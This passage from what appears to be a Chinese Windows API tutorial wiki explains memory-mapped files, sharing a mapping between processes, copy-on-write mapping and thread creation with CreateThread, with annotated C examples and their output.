关闭句柄 return 0;&#125; 先运行程序A，然后运行程序B 程序A程序B"},{"title":"内存映射文件","path":"/wiki/Windows_API/内存映射文件.html","content":"内存映射文件 调用CreateFileMapping时如果第一个参数传了hFile，那么准备物理页后，会将文件内容映射到物理页上。随后，进程调用MapViewOfFile将自身的虚拟地址空间与该物理页进行关联。那么，访问自身的内存就相当于是在访问文件内容。 看其名，知其意： 如果CreateFileMapping函数传了hFile，可以理解为这个文件创建文件映射(FileMapping)。 MapViewOfFile，就是将视图（View)（视图指进程中的虚拟地址空间）和物理页进行关联（Map）。 随后，进程使用指针来操作该视图（View)，读写文件就如同读写内存一样简单。 好处： 读写自身内存更方便 当目标文件是大文件，读写自身内存效率高，I/O操作效率低 这块内存是共享内存，可以跨进程共享数据 例内存映射文件-读文件内存映射文件-写文件程序中使用CreateFile创建C:\\A.txt文件的文件句柄，为该文件创建内存映射文件，读自身的线性地址，打印该文件前4字节内容到cmd上。C:\\\\A.txt文件内容10000000000000000000123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172#include &lt;windows.h&gt;#include &lt;stdio.h&gt;int main()&#123; const char *lpcFile = &quot;C:\\\\A.txt&quot;; // 目标文件路径 HANDLE hFile; HANDLE hMapFile; LPVOID lpAddr; // 打开文件 hFile = CreateFile( lpcFile, // 文件路径 GENERIC_READ | GENERIC_WRITE, // 访问模式：读写 0, // 共享模式：不共享 NULL, // 安全属性：默认 OPEN_EXISTING, // 打开现有的文件 FILE_ATTRIBUTE_NORMAL, // 文件属性：普通文件 NULL // 模板文件句柄：不使用 ); // 判断CreateFile是否执行成功 if (hFile == INVALID_HANDLE_VALUE) &#123; printf(&quot;CreateFile failed: %d &quot;, GetLastError()); return 1; // 更正返回值，通常在错误时返回非零值 &#125; // 创建文件映射对象 hMapFile = CreateFileMapping( hFile, // 文件句柄 NULL, // 默认安全级别 PAGE_READWRITE, // 可读可写保护 0, // 映射对象的大小的高32位 0, // 映射对象的大小的低32位，0表示映射整个文件 NULL // 映射对象的名字，NULL表示不命名 ); // 判断CreateFileMapping是否执行成功 if (hMapFile == NULL) &#123; printf(&quot;CreateFileMapping failed: %d &quot;, GetLastError()); CloseHandle(hFile); // 如果失败，关闭文件句柄 return 1; &#125; // 将文件数据映射到进程的地址空间 lpAddr = MapViewOfFile( hMapFile, // 文件映射对象句柄 FILE_MAP_ALL_ACCESS, // 请求读写访问权 0, // 文件数据的起始偏移量的高32位 0, // 文件数据的起始偏移量的低32位 0 // 映射视图的大小，0表示从偏移量到文件末尾 ); // 判断MapViewOfFile是否执行成功 if (lpAddr == NULL) &#123; printf(&quot;MapViewOfFile failed: %d &quot;, GetLastError()); CloseHandle(hMapFile); // 如果失败，关闭映射对象句柄 CloseHandle(hFile); // 关闭文件句柄 return 1; &#125; // 读取映射视图的最开始的4个字节 DWORD dwTest1 = *(LPDWORD)lpAddr; // 将lpAddr强制转换为LPDWORD然后解引用获取DWORD值 printf(&quot;First 4 bytes of the file in hexadecimal: %08x &quot;, dwTest1); // 清理资源 UnmapViewOfFile(lpAddr); // 取消映射 CloseHandle(hMapFile); // 关闭文件映射对象的句柄 CloseHandle(hFile); // 关闭文件的句柄 return 0;&#125;字符0的ASCII码是0x30FileMapping为了保证效率，它不是实时写入，而是将修改先存到缓存中。当系统的写入缓冲区满时由操作系统决定何时刷新到磁盘，或是在UnmapViewOfFile调用时写回文件。需要马上写入的话要调用FlushViewOfFile函数来强制更新缓存，将视图立即 写回文件。FlushViewOfFile1234BOOL FlushViewOfFile( [in] LPCVOID lpBaseAddress, //要刷新的缓存的地址 [in] SIZE_T dwNumberOfBytesToFlush //要刷新的字节数，如果为0则将整个视图都写回);程序中使用CreateFile创建C:\\A.txt文件的文件句柄，为该文件创建内存映射文件，读自身的线性地址，打印该文件前4字节内容到cmd上，然后修改这4字节内容都为字符A，再次打印该文件前4字节内容到cmd上。CreateFile时改为共享读，方便调试时看A.txt文件的修改情况1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283#include &lt;windows.h&gt;#include &lt;stdio.h&gt;int main()&#123; const char *lpcFile = &quot;C:\\\\A.txt&quot;; // 目标文件路径 HANDLE hFile; HANDLE hMapFile; LPVOID lpAddr; // 打开文件 hFile = CreateFile( lpcFile, // 文件路径 GENERIC_READ | GENERIC_WRITE, // 访问模式：读写+ FILE_SHARE_READ, // 共享模式：共享读 NULL, // 安全属性：默认 OPEN_EXISTING, // 打开现有的文件 FILE_ATTRIBUTE_NORMAL, // 文件属性：普通文件 NULL // 模板文件句柄：不使用 ); // 判断CreateFile是否执行成功 if (hFile == INVALID_HANDLE_VALUE) &#123; printf(&quot;CreateFile failed: %d &quot;, GetLastError()); return 1; // 更正返回值，通常在错误时返回非零值 &#125; // 创建文件映射对象 hMapFile = CreateFileMapping( hFile, // 文件句柄 NULL, // 默认安全级别 PAGE_READWRITE, // 可读可写保护 0, // 映射对象的大小的高32位 0, // 映射对象的大小的低32位，0表示映射整个文件 NULL // 映射对象的名字，NULL表示不命名 ); // 判断CreateFileMapping是否执行成功 if (hMapFile == NULL) &#123; printf(&quot;CreateFileMapping failed: %d &quot;, GetLastError()); CloseHandle(hFile); // 如果失败，关闭文件句柄 return 1; &#125; // 将文件数据映射到进程的地址空间 lpAddr = MapViewOfFile( hMapFile, // 文件映射对象句柄 FILE_MAP_ALL_ACCESS, // 请求读写访问权 0, // 文件数据的起始偏移量的高32位 0, // 文件数据的起始偏移量的低32位 0 // 映射视图的大小，0表示从偏移量到文件末尾 ); // 判断MapViewOfFile是否执行成功 if (lpAddr == NULL) &#123; printf(&quot;MapViewOfFile failed: %d &quot;, GetLastError()); CloseHandle(hMapFile); // 如果失败，关闭映射对象句柄 CloseHandle(hFile); // 关闭文件句柄 return 1; &#125; // 读取映射视图的最开始的4个字节 DWORD dwTest1 = *(LPDWORD)lpAddr; // 将lpAddr强制转换为LPDWORD然后解引用获取DWORD值 printf(&quot;First 4 bytes of the file in hexadecimal: %08x &quot;, dwTest1);+ // 修改最开始的4个字节为字符 &#x27;A&#x27;+ memset(lpAddr, &#x27;A&#x27;, 4);+ // 刷新修改到磁盘文件+ if (!FlushViewOfFile(lpAddr, 0)) + &#123; // 0表示刷新整个映射视图+ printf(&quot;FlushViewOfFile failed: %d &quot;, GetLastError());+ &#125;+ // 读取并打印修改后的4个字节+ dwTest1 = *(LPDWORD)lpAddr;+ printf(&quot;First 4 bytes of the file in hexadecimal after change: %08x &quot;, dwTest1); // 清理资源 UnmapViewOfFile(lpAddr); // 取消映射 CloseHandle(hMapFile); // 关闭文件映射对象的句柄 CloseHandle(hFile); // 关闭文件的句柄 return 0;&#125; 多进程共享内存映射文件 CreateFileMapping创建FileMapping给这个内核对象起名字，其他进程通过具名对象来指向同一个物理页，因为这个物理页关联了文件，所以这两个进程共享了文件。 例程序A程序B程序A中使用CreateFile创建C:\\A.txt文件的文件句柄，为该文件创建内存映射文件，读自身的线性地址，打印该文件前4字节内容到cmd上，然后修改这4字节内容为字符A，再次打印该文件前4字节内容到cmd上，然后getchar()阻塞，切换去执行程序B程序A1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980#include &lt;windows.h&gt;#include &lt;stdio.h&gt;int main()&#123; const char *lpcFile = &quot;C:\\\\A.txt&quot;; // 目标文件路径 HANDLE hFile; HANDLE hMapFile; LPVOID lpAddr; // 打开文件 hFile = CreateFile( lpcFile, // 文件路径 GENERIC_READ | GENERIC_WRITE, // 访问模式：读写 0, // 共享模式：不共享 NULL, // 安全属性：默认 OPEN_EXISTING, // 打开现有的文件 FILE_ATTRIBUTE_NORMAL, // 文件属性：普通文件 NULL // 模板文件句柄：不使用 ); // 判断CreateFile是否执行成功 if (hFile == INVALID_HANDLE_VALUE) &#123; printf(&quot;CreateFile failed: %d &quot;, GetLastError()); return 1; // 更正返回值，通常在错误时返回非零值 &#125; // 创建文件映射对象 hMapFile = CreateFileMapping( hFile, // 文件句柄 NULL, // 默认安全级别 PAGE_READWRITE, // 可读可写保护 0, // 映射对象的大小的高32位 0, // 映射对象的大小的低32位，0表示映射整个文件 &quot;SharedMemoryA&quot; // 映射对象的名字 ); // 判断CreateFileMapping是否执行成功 if (hMapFile == NULL) &#123; printf(&quot;CreateFileMapping failed: %d &quot;, GetLastError()); CloseHandle(hFile); // 如果失败，关闭文件句柄 return 1; &#125; // 将文件数据映射到进程的地址空间 lpAddr = MapViewOfFile( hMapFile, // 文件映射对象句柄 FILE_MAP_ALL_ACCESS, // 请求读写访问权 0, // 文件数据的起始偏移量的高32位 0, // 文件数据的起始偏移量的低32位 0 // 映射视图的大小，0表示从偏移量到文件末尾 ); // 判断MapViewOfFile是否执行成功 if (lpAddr == NULL) &#123; printf(&quot;MapViewOfFile failed: %d &quot;, GetLastError()); CloseHandle(hMapFile); // 如果失败，关闭映射对象句柄 CloseHandle(hFile); // 关闭文件句柄 return 1; &#125; // 读取映射视图的最开始的4个字节 DWORD dwTest1 = *(LPDWORD)lpAddr; // 将lpAddr强制转换为LPDWORD然后解引用获取DWORD值 printf(&quot;First 4 bytes of the file in hexadecimal: %08x &quot;, dwTest1); // 修改最开始的4个字节为字符 &#x27;A&#x27; memset(lpAddr, &#x27;A&#x27;, 4); // 读取并打印修改后的4个字节 dwTest1 = *(LPDWORD)lpAddr; printf(&quot;First 4 bytes of the file in hexadecimal after change: %08x &quot;, dwTest1); getchar(); //阻塞，便于观察 // 清理资源 UnmapViewOfFile(lpAddr); // 取消映射 CloseHandle(hMapFile); // 关闭文件映射对象的句柄 CloseHandle(hFile); // 关闭文件的句柄 return 0;&#125;程序B通过调用OpenFileMapping打开了程序A创建的具有名字 “SharedMemoryA” 的映射对象。之后它将映射对象映射到自己的地址空间，并读取映射区域的前4个字节。程序B1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950#include &lt;windows.h&gt;#include &lt;stdio.h&gt;int main()&#123; HANDLE hMapFile; LPVOID lpAddr; // 打开现有的文件映射对象 hMapFile = OpenFileMapping( FILE_MAP_ALL_ACCESS, // 请求读写访问权 FALSE, // 继承句柄：不继承 &quot;SharedMemoryA&quot; // 文件映射对象的名字 ); // 判断OpenFileMapping是否执行成功 if (hMapFile == NULL) &#123; printf(&quot;OpenFileMapping failed: %d &quot;, GetLastError()); return 1; &#125; // 将文件映射对象映射到进程的地址空间 lpAddr = MapViewOfFile( hMapFile, // 文件映射对象句柄 FILE_MAP_ALL_ACCESS, // 请求读写访问权 0, // 文件数据的起始偏移量的高32位 0, // 文件数据的起始偏移量的低32位 0 // 映射视图的大小，0表示从偏移量到文件末尾 ); // 判断MapViewOfFile是否执行成功 if (lpAddr == NULL) &#123; printf(&quot;MapViewOfFile failed: %d &quot;, GetLastError()); CloseHandle(hMapFile); // 如果失败，关闭映射对象句柄 return 1; &#125; // 读取映射视图的最开始的4个字节 DWORD dwTest1 = *(LPDWORD)lpAddr; // 将lpAddr强制转换为LPDWORD然后解引用获取DWORD值 printf(&quot;First 4 bytes of the shared memory in hexadecimal: %08x &quot;, dwTest1); printf(&quot;Process B read&quot;); getchar(); // 清理资源 UnmapViewOfFile(lpAddr); // 取消映射 CloseHandle(hMapFile); // 关闭文件映射对象的句柄 return 0;&#125;记事本A.txt运行前10000000000000000000运行程序A，修改A.txt，然后阻塞在getchar()程序A输出123First 4 bytes of the file in hexadecimal: 30303030First 4 bytes of the file in hexadecimal after change: 41414141随后运行程序B程序B输出12First 4 bytes of the shared memory in hexadecimal: 41414141Process B read说明A进程对物理页的修改，B进程这边也看到了。它们是共享同一块物理页的两个进程都结束后，A.txt的内容被修改为两个程序都结束后的记事本A.txt1AAAA000000000000000 内存映射文件之写拷贝 前言 系统的DLL文件通常通过文件映射（FileMapping）的方式与物理内存页关联起来。之后，每个进程都可以通过调用MapViewOfFile函数来将这些物理页映射到它们各自的虚拟内存空间。结果就是，尽管这些DLL文件在物理内存中只有一份，但每个进程看起来都好像在它们各自的虚拟空间中独立加载了DLL。 当多个进程读取这些共享的物理页时，并不会引起冲突。但如果某个进程通过它的虚拟地址修改了物理页的内容，这种改动将会影响到共享该物理页的其他进程。（上面的程序A和程序B就展示了这种情况：程序A修改了共享物理页的内容，进程B随后读出了这种修改。并且程序A和程序B都关闭后，文件的内容也被改了。把这个文件换成系统dll，原理一样。） 实验： 假设使用OD对某个程序A的MessageBox函数下普通断点，普通断点的本质就是替换函数第一个字节为&quot;0xCC&quot;（模拟修改物理页的操作）。当程序执行到0xCC（对应int 3汇编指令）时会停下，进入调试状态。随后，打开另一个调用MessageBox的程序B来观察它是否能正常执行MessageBox函数。 如果： 程序B在执行MessageBox函数时被断下，这说明进程B中MessageBox函数的第一个字节被换成了0xCC 程序B能够正常执行MessageBox函数，这说明存在某种机制确保进程A对共享物理页的修改没有影响到进程B。 写拷贝（Copy-on-Write） 写拷贝机制就是用于防止这类问题的。当某个进程尝试对共享物理页进行写操作时，操作系统会创建该物理页的一个副本。这样，该进程的写操作只影响这个副本，不会波及其他进程。映射视图解除后，文件内容同样不会受到影响。 如果在调用MapViewOfFile函数时第二个参数使用的是FILE_MAP_COPY选项，它意味着写操作将会触发拷贝。例如，当进程A尝试修改物理页内容时，操作系统将为其写操作创建一个新的物理页（一个物理页4KB大小）。这样，原始物理页及其内容（包括关联的文件内容）不会受到影响，进程B的执行也不会被干扰。 例把上面程序A和程序B的MapViewOfFile的第二个参数都改成写拷贝程序A程序B1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980#include &lt;windows.h&gt;#include &lt;stdio.h&gt;int main()&#123; const char *lpcFile = &quot;C:\\\\A.txt&quot;; // 目标文件路径 HANDLE hFile; HANDLE hMapFile; LPVOID lpAddr; // 打开文件 hFile = CreateFile( lpcFile, // 文件路径 GENERIC_READ | GENERIC_WRITE, // 访问模式：读写 0, // 共享模式：不共享 NULL, // 安全属性：默认 OPEN_EXISTING, // 打开现有的文件 FILE_ATTRIBUTE_NORMAL, // 文件属性：普通文件 NULL // 模板文件句柄：不使用 ); // 判断CreateFile是否执行成功 if (hFile == INVALID_HANDLE_VALUE) &#123; printf(&quot;CreateFile failed: %d &quot;, GetLastError()); return 1; // 更正返回值，通常在错误时返回非零值 &#125; // 创建文件映射对象 hMapFile = CreateFileMapping( hFile, // 文件句柄 NULL, // 默认安全级别 PAGE_READWRITE, // 可读可写保护 0, // 映射对象的大小的高32位 0, // 映射对象的大小的低32位，0表示映射整个文件 &quot;SharedMemoryA&quot; // 映射对象的名字 ); // 判断CreateFileMapping是否执行成功 if (hMapFile == NULL) &#123; printf(&quot;CreateFileMapping failed: %d &quot;, GetLastError()); CloseHandle(hFile); // 如果失败，关闭文件句柄 return 1; &#125; // 将文件数据映射到进程的地址空间 lpAddr = MapViewOfFile( hMapFile, // 文件映射对象句柄+ FILE_MAP_COPY, // 写拷贝 0, // 文件数据的起始偏移量的高32位 0, // 文件数据的起始偏移量的低32位 0 // 映射视图的大小，0表示从偏移量到文件末尾 ); // 判断MapViewOfFile是否执行成功 if (lpAddr == NULL) &#123; printf(&quot;MapViewOfFile failed: %d &quot;, GetLastError()); CloseHandle(hMapFile); // 如果失败，关闭映射对象句柄 CloseHandle(hFile); // 关闭文件句柄 return 1; &#125; // 读取映射视图的最开始的4个字节 DWORD dwTest1 = *(LPDWORD)lpAddr; // 将lpAddr强制转换为LPDWORD然后解引用获取DWORD值 printf(&quot;First 4 bytes of the file in hexadecimal: %08x &quot;, dwTest1); // 修改最开始的4个字节为字符 &#x27;A&#x27; memset(lpAddr, &#x27;A&#x27;, 4); // 读取并打印修改后的4个字节 dwTest1 = *(LPDWORD)lpAddr; printf(&quot;First 4 bytes of the file in hexadecimal after change: %08x &quot;, dwTest1); getchar(); //阻塞，便于观察 // 清理资源 UnmapViewOfFile(lpAddr); // 取消映射 CloseHandle(hMapFile); // 关闭文件映射对象的句柄 CloseHandle(hFile); // 关闭文件的句柄 return 0;&#125;1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950#include &lt;windows.h&gt;#include &lt;stdio.h&gt;int main()&#123; HANDLE hMapFile; LPVOID lpAddr; // 打开现有的文件映射对象 hMapFile = OpenFileMapping( FILE_MAP_ALL_ACCESS, // 请求读写访问权 FALSE, // 继承句柄：不继承 &quot;SharedMemoryA&quot; // 文件映射对象的名字 ); // 判断OpenFileMapping是否执行成功 if (hMapFile == NULL) &#123; printf(&quot;OpenFileMapping failed: %d &quot;, GetLastError()); return 1; &#125; // 将文件映射对象映射到进程的地址空间 lpAddr = MapViewOfFile( hMapFile, // 文件映射对象句柄+ FILE_MAP_COPY, // 写拷贝 0, // 文件数据的起始偏移量的高32位 0, // 文件数据的起始偏移量的低32位 0 // 映射视图的大小，0表示从偏移量到文件末尾 ); // 判断MapViewOfFile是否执行成功 if (lpAddr == NULL) &#123; printf(&quot;MapViewOfFile failed: %d &quot;, GetLastError()); CloseHandle(hMapFile); // 如果失败，关闭映射对象句柄 return 1; &#125; // 读取映射视图的最开始的4个字节 DWORD dwTest1 = *(LPDWORD)lpAddr; // 将lpAddr强制转换为LPDWORD然后解引用获取DWORD值 printf(&quot;First 4 bytes of the shared memory in hexadecimal: %08x &quot;, dwTest1); printf(&quot;Process B read&quot;); getchar(); // 清理资源 UnmapViewOfFile(lpAddr); // 取消映射 CloseHandle(hMapFile); // 关闭文件映射对象的句柄 return 0;&#125;记事本A.txt运行前10000000000000000000运行程序A，修改A.txt，然后阻塞在getchar()程序A输出123First 4 bytes of the file in hexadecimal: 30303030First 4 bytes of the file in hexadecimal after change: 41414141随后运行程序B，看能否读出进程A对共享物理页的修改程序B输出12First 4 bytes of the shared memory in hexadecimal: 30303030Process B read说明A进程对物理页的修改是新的副本的修改，没影响到原始的物理页。B进程读的还是原始的物理页的内容两个进程都结束后，A.txt的内容未被修改，还是：两个程序都结束后的记事本A.txt10000000000000000000"},{"title":"创建线程","path":"/wiki/Windows_API/创建线程.html","content":"什么是线程 进程提供了程序运行所需要的资源，而线程是附属在进程上的执行实体，是代码的执行流程。这也是金句“进程就是4GB，线程就是EIP”（进程是4GB虚拟空间里的内容，线程是具体执行的代码）出处的依据。 进程是空间上的概念，线程是时间上的概念。如果只有进程，这个程序是不会动的。一个进程至少要有一个线程，进程创建时提供了程序运行时所需要的资源（包括一个线程），便开始执行线程，这个线程又称主线程。主线程可以创建其他线程。 在Windows任务管理器中可以看到每个进程当前的线程数量，线程数为3，表示有3段代码在“同时执行”。在系统中，同时存在的线程比CPU数量多。 并不一定是“同时执行”，如果是单核CPU（一个CPU只有一套寄存器，一个CPU在同一个时间只能执行一条机器指令），而每个线程都要有自己的栈、上下文（context，包括CPU寄存器值等）等。单核CPU上的多线程是通过时间片切换来完成的，这个时间片执行A线程，下个时间片执行B线程，由于切换时间短，频率高，用户感觉不到，彷佛和多核CPU没区别，实际上是宏观并行，微观串行。如果是多核CPU，就有多套寄存器，每个核都能跑一个线程，这才是真正意义上的多线程。 主线程 一段程序中如果没有额外创建线程，main函数代码的执行流程就是一个主线程。下面这段代码在任务管理器中可以看到线程数是1。 12345678910111213#include &lt;windows.h&gt;#include &lt;stdio.h&gt;int main(int argc, char* argv[])&#123; // 要执行的代码 for (int i = 0; i &lt; 100; i++) &#123; Sleep(500); printf(&quot;------ %d &quot;, i); &#125; return 0;&#125; 创建线程 CreateThread函数 需要增加线程，使用CreateThread函数 12345678HANDLE CreateThread( // 返回线程的句柄 [in, optional] LPSECURITY_ATTRIBUTES lpThreadAttributes, // SD 安全属性，包含安全描述符 [in] SIZE_T dwStackSize, // initial stack size 初始堆栈大小 [in] LPTHREAD_START_ROUTINE lpStartAddress, // thread function 线程执行的函数代码 [in, optional] __drv_aliasesMem LPVOID lpParameter, // thread argument 线程需要的参数 [in] DWORD dwCreationFlags, // creation option 创建标志 [out, optional] LPDWORD lpThreadId // thread identifier out参数，返回线程ID); lpThreadAttributes：指向SECURITY_ATTRIBUTES安全属性结构体的指针。SECURITY_ATTRIBUTES.bInheritHandle成员可以标识这个句柄是否可以被继承 dwStackSize：线程初始堆栈的大小。 填0就默认使用PE文件中标识的堆栈大小 每个线程都有它自己的堆栈。以前我们写的程序只有一个主线程，就是一个堆栈。现在多创建一个线程，不能共用要不会乱，所以每个线程都有自己独立的堆栈。 lpStartAddress：线程执行的函数代码 lpParameter：线程函数的参数。 如果要给线程执行的函数传参数，通过这个参数传。如果线程中需要使用的参数较多，可以将参数封装在结构体中，将结构体指针作为线程参数。 dwCreationFlags：创建线程的标志。 0：创建后马上执行 CREATE_SUSPENDED：挂起，直到执行ResumeThread函数后恢复执行 lpThreadId：out参数，返回线程ID 线程通信 线程之间的执行顺序是由操作系统的调度策略决定的，因此打印顺序是无序的。如果需要控制，这涉及线程通信方面的知识，后面讲 1234567891011121314151617181920212223242526272829303132333435363738#include &lt;windows.h&gt;#include &lt;stdio.h&gt;DWORD WINAPI ThreadProc(LPVOID lpParameter) &#123; // 线程执行的代码 for (int i = 0; i &lt; 100; i++) &#123; Sleep(500); printf(&quot;Thread: %d &quot;, i); &#125; return 0;&#125;int main(int argc, char* argv[]) &#123; // 创建线程，不接收返回值 CreateThread( NULL, // lpThreadAttributes, 线程安全属性，NULL表示默认安全级别 0, // dwStackSize, 线程堆栈大小，0表示默认大小 ThreadProc, // lpStartAddress, 线程函数的指针 NULL, // lpParameter, 传递给线程函数的参数 0, // dwCreationFlags, 线程创建标志，0表示线程立即运行 NULL // lpThreadId, 返回线程ID的指针，NULL表示不需要 ); // 主线程执行的代码 for (int i = 0; i &lt; 100; i++) &#123; Sleep(500); printf(&quot;Main: %d &quot;, i); &#125; // 可以等待线程结束，防止主线程过早退出导致看不到线程输出 system(&quot;pause&quot;); return 0;&#125; 线程内核对象被清理的两个条件 看别人的代码可能看到一创建线程后就CloseHandle，因为线程内核对象释放需要两个必要条件： 线程的代码执行完毕或线程被终结 线程内核对象计数器为0 所以一创建线程后CloseHandle其实没影响，线程还在跑。但如果后续需要这个线程句柄来操纵这个线程，就别那么早CloseHandle掉 1234567891011HANDLE hThread;// 创建线程hTread = CreateThread( NULL, // lpThreadAttributes, 线程安全属性，NULL表示默认安全级别 0, // dwStackSize, 线程堆栈大小，0表示默认大小 ThreadProc, // lpStartAddress, 线程函数的指针 NULL, // lpParameter, 传递给线程函数的参数 0, // dwCreationFlags, 线程创建标志，0表示线程立即运行 NULL // lpThreadId, 返回线程ID的指针，NULL表示不需要);CloseHandle(hTread); 线程函数和参数传递 线程函数只是告诉操作系统新建的线程执行的代码在哪，它的格式不是必须的，强转一下仍能编译通过。 编译通过12345678910111213141516171819202122232425262728293031323334353637#include &lt;windows.h&gt;#include &lt;stdio.h&gt;// 改了函数返回类型，改了函数名VOID WINAPI MyThreadProc()&#123; // 线程执行的代码 for (int i = 0; i &lt; 100; i++) &#123; Sleep(500); printf(&quot;Thread: %d &quot;, i); &#125;&#125;int main(int argc, char *argv[])&#123; // 创建线程，不接收返回值 CreateThread( NULL, 0, (LPTHREAD_START_ROUTINE)MyThreadProc, // 强转 NULL, 0, NULL); // 主线程执行的代码 for (int i = 0; i &lt; 100; i++) &#123; Sleep(500); printf(&quot;Main: %d &quot;, i); &#125; // 可以等待线程结束，防止主线程过早退出导致看不到线程输出 system(&quot;pause&quot;); return 0;&#125; 参数和线程函数的生命周期 向线程函数传递的参数的生命周期必须比线程函数的生命周期长，否则这个参数在堆栈中被销毁了，而线程函数还在跑，这会出错的。最好将线程函数的参数定义成全局变量，全局变量的生命周期是程序运行时分配，程序结束时销毁，生命周期就比线程函数长。 123456789101112131415161718192021222324252627282930313233343536#include &lt;windows.h&gt;#include &lt;stdio.h&gt;DWORD WINAPI ThreadProc(LPVOID lpParameter) &#123; int *pValue = (int *)lpParameter; // 将传入的参数转换为整型指针 for(int i = 0; i &lt; *pValue; i++) &#123; Sleep(100); printf(&quot;Thread: %d, Param: %d &quot;, i, *pValue); &#125; return 0;&#125;int main(int argc, char* argv[]) &#123; int threadParam = 123; // 线程函数的参数 // 创建线程，并传入threadParam的地址 CreateThread( NULL, 0, ThreadProc, &amp;threadParam, // 将threadParam的地址传递给线程 0, NULL ); for(int i = 0; i &lt; 100; i++) &#123; Sleep(150); printf(&quot;Main: %d &quot;, i); &#125; // 等待线程结束，确保threadParam在ThreadProc结束前不被销毁 system(&quot;pause&quot;); return 0;&#125; UI线程和工作线程 示例说明 程序包含一个对话框，设有一个编辑框和一个开始按钮。编辑框初始显示值为1000。当用户点击开始按钮时，该值每秒自动递减1，直至减至0。 实现细节：创建win32程序，新建一个对话框，拉一个编辑框，拉一个按钮。编辑框的初始值设置为1000。当用户点击开始按钮时，调用StartCountdown函数逐步递减编辑框中的值。下面是关键的实现代码： 多字节字符集 关闭SDL123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960#include &lt;windows.h&gt;#include &lt;stdio.h&gt; //sprintf#include &quot;resource.h&quot;BOOL CALLBACK DialogProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam);void StartCountdown(HWND hEdit);int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) &#123; DialogBox(hInstance, MAKEINTRESOURCE(IDD_MYDIALOG), NULL, DialogProc); return 0;&#125;BOOL CALLBACK DialogProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) &#123; static HWND hEdit; switch (msg) &#123; case WM_INITDIALOG: hEdit = GetDlgItem(hwnd, IDC_COUNT_EDIT); SetWindowText(hEdit, TEXT(&quot;1000&quot;)); //设置编辑框初始显示的值为1000 return TRUE; case WM_COMMAND: if (LOWORD(wParam) == IDC_START_BUTTON) &#123; StartCountdown(hEdit); // Call the function when start button is pressed return TRUE; &#125; break; case WM_CLOSE: EndDialog(hwnd, 0); return TRUE; &#125; return FALSE;&#125;void StartCountdown(HWND hEdit) &#123; char buf[10] = &#123; 0 &#125;; int count; GetWindowText(hEdit, buf, 10); // 从编辑框读值 count = atoi(buf); // 字符转数字 ////点击一次减一次 //sprintf(buf, &quot;%d&quot;, --count); //SetWindowText(hEdit, buf); // 自动递减至0 while (count &gt; 0) &#123; sprintf(buf, &quot;%d&quot;, --count); // 数字转字符 SetWindowText(hEdit, buf); // 设置编辑框的值 Sleep(1000); // Wait for 1 second &#125;&#125; 相关API1234567891011121314151617181920212223GetDlgItem(hDlg, IDC_EDIT_TIMER); //获取子窗口句柄GetWindowText(句柄, 数据缓冲区, 长度); //从编辑框获取文本sscanf(szBuffer, &quot;%d&quot;, &amp;dwTimer); //字符串转数字sprintf(数据缓冲区, &quot;%d&quot;, 数字); //数字转字符串SetWindowText(句柄, 数据缓存区); //设置编辑框文本----例GetDlgItem(hDlg, IDC_EDIT_TIMER); //获取子窗口句柄TCHAR szBuffer[256]; // 假设足够大以存储编辑框内容GetWindowText(hEdit, szBuffer, sizeof(szBuffer)); // 从编辑框获取文本int dwTimer;sscanf(szBuffer, &quot;%d&quot;, &amp;dwTimer); // 将获取的字符串转换为整数sprintf(szBuffer, &quot;%d&quot;, dwTimer); // 将整数格式化回字符串SetWindowText(hEdit, szBuffer); // 更新编辑框文本 问：当开始按钮被点下后，窗口程序卡死了，为什么？ 答案：一个进程至少有一个主线程，在这个例子中。没有新建线程，只有一个主线程。当开始按钮被点击后，主线程被占用于执行递减计数的任务中。主界面的GUI更新和事件处理没有线程跑，被阻塞了。因此在执行递减计数期间，界面将无法响应其他输入，界面也无法刷新除编辑框外的其他部分。这表现为应用程序“卡住”直到循环结束。 建议：不要在主线程（也是UI线程）中处理逻辑复杂的业务，因为这会阻塞用户界面的正常响应。建议新开一个线程处理这种耗时操作，从而避免阻塞UI线程，让UI线程可以保持响应，继续处理用户输入和窗口库消息，保持应用程序界面的响应和流畅性。 新建线程来执行StartCountdown的事，这样，UI线程可以保持响应用户的输入 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465#include &lt;windows.h&gt;#include &lt;stdio.h&gt; //sprintf#include &quot;resource.h&quot;BOOL CALLBACK DialogProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam);DWORD WINAPI StartCountdown(LPVOID lpParam);int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)&#123; DialogBox(hInstance, MAKEINTRESOURCE(IDD_MYDIALOG), NULL, DialogProc); return 0;&#125;BOOL CALLBACK DialogProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)&#123; static HWND hEdit; switch (msg) &#123; case WM_INITDIALOG: hEdit = GetDlgItem(hwnd, IDC_COUNT_EDIT); SetWindowText(hEdit, TEXT(&quot;1000&quot;)); //设置编辑框初始显示的值为1000 return TRUE; case WM_COMMAND: if (LOWORD(wParam) == IDC_START_BUTTON) &#123; HANDLE hThread = CreateThread(NULL, 0, StartCountdown, (LPVOID)hEdit, 0, NULL);// 创建一个新线程来处理倒计时，防止UI卡顿 CloseHandle(hThread); return TRUE; &#125; break; case WM_CLOSE: EndDialog(hwnd, 0); return TRUE; &#125; return FALSE;&#125;DWORD WINAPI StartCountdown(LPVOID lpParam)&#123; HWND hEdit = (HWND)lpParam; char buf[10] = &#123; 0 &#125;; int count; GetWindowText(hEdit, buf, 10); // 从编辑框读值 count = atoi(buf); // 字符转数字 ////点击一次减一次 //sprintf(buf, &quot;%d&quot;, --count); //SetWindowText(hEdit, buf); // 自动递减至0 while (count &gt; 0) &#123; sprintf(buf, &quot;%d&quot;, --count); // 数字转字符 SetWindowText(hEdit, buf); // 设置编辑框的值 Sleep(1000); // Wait for 1 second &#125; return 0;&#125; 小结 